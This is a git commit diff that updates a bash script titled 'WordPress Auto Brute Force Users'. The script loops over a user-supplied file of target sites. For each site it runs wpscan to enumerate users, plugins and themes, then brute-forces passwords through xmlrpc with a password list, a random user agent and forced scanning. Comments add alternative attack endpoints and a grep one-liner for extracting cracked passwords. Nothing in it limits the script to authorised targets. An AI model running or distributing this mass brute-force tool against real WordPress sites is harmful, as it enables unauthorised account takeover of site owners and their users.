963d397c60e21b31806b660748c1c3a8d62db4d9
Leighton Clucas <63763567+leighton-0@users.noreply.github.com>
2023-01-12 21:49:51 +0000

    Update wp_autoscan.sh

--- wp_autoscan.sh
+++ wp_autoscan.sh
@@ -1,5 +1,15 @@
+#!/bin/bash
+command clear
+
+printf '\n########################################################################\n'
+printf '##                 WordPress Auto Brute Force Users                   ##\n'
+printf '##                     Leighton-0    (Jan 2023)                       ##\n'
+printf '########################################################################\n\n'
+
+sleep 5
+
 wpscan --update
-read -p $'\e[1;92m Liste mit Wordpresswebistes: \e[0m' wl_pass
+read -p $'\e[1;92m File path for targets: \e[0m' wl_pass
 # -p prompt asks for a file name for the list of sites - names this site wl_pass
 
 wl_pass="${wl_pass}"
@@ -9,7 +19,16 @@ count_pass=$(wc -l $wl_pass | cut -d " " -f1)
 # counts the number of lines in wp_pass file
 
 for fn in `cat $wl_pass`; do
-wpscan --url $fn -e  u,vp  >> result
+wpscan --url $fn -e  u vp vt --passwords zz_passwords --random-user-agent --password-attack xmlrpc --ignore-main-redirect --force >> result1
+# Note: wp-login can be interchanged with xmlrpc or xmlrpcmulitcall
+
 done
 
-print "Fertig, bitte in result nachsehen"
+print "Finished - check the results"
+
+#   README
+#   Usefull for parsing results
+#   cat result1 | grep -v Error: | grep -v Progress: | grep 'passwords \| Passwords \| password \| Password'  > result2 && less result2
+
+#   TO DO
+#   Improve Parsing
